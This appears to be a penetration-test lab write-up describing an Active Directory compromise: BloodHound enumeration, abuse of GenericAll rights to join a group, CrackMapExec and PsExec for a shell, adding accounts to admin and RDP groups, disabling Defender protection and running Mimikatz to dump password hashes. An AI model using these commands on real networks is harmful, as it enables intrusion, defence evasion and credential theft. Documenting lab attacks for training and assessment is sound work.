## Steps to compromise
Running bloodhound on any of the machines will allow build a graph database of all the users, 
computers, groups, and acls. This will help us determine our next attack path. For this purpose, we 
used the USER machine to run the SharpHound ingestor, and we viewed it in BloodHound. The 
command that was used to collect the information is below:
```
Import-Module .\SharpHound.ps1
Invoke-Bloodhound -CollectionMethod All,loggedon
```
Once the zip file is ingested in the bloodhound database we can do some more enumeration
![image](https://user-images.githubusercontent.com/25303133/220045040-6c28475c-e810-4150-8869-408a722ebbc3.png)

Since we have successfully compromising DEVSRV and getting the NTLM hash for devsqladmin we can 
look for anything interesting related to this account. Looking at the First Degree Object Controls for 
devsqladmin, we verify that this account has GenericAll rights on the SQLMANAGERS domain group.

This means that we can add any user to this group. With our reverse shell still running as devsqladmin, 
we successfully added the examAd user to the SQLMANAGERS group.
```
net group “SQLMANAGERS” examAd /domain /add
```
Enumerating the SQLMANAGERS group even further, we see a description in bloodhound saying that it 
is Used to manage uatsrv.

We can verify this by running a tool called CrackMapExec 3
to see if we can write to any shares.
```
crackmapexec -u [user] -p [password] -d [domain] [ip] --shares
```
We can Read, Write to C$ and ADMIN$, this means we can run PsExec 4
to get a shell on UATSRV
```
PsExec64.exe \\[instance] cmd
```
Once we have our shell, we add our user the Remote Desktop Users group so we can PSRemote and run 
mimikatz easier
```
net localgroup Administrator user /add
net localgroup “Remote Desktop Users” user /add

$sess = New-PSSession -ComputerName uatsrv.garrison.castle.local
Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection 
$true} -Session $sess
Invoke-command -ScriptBlock ${function:Invoke-Mimikatz} -Session $sess
```
Running mimikatz reveals additional users on UATSRV, which are batchuser and uatadmin. We 
successfully grabbed the hashes for both users to use later if needed.
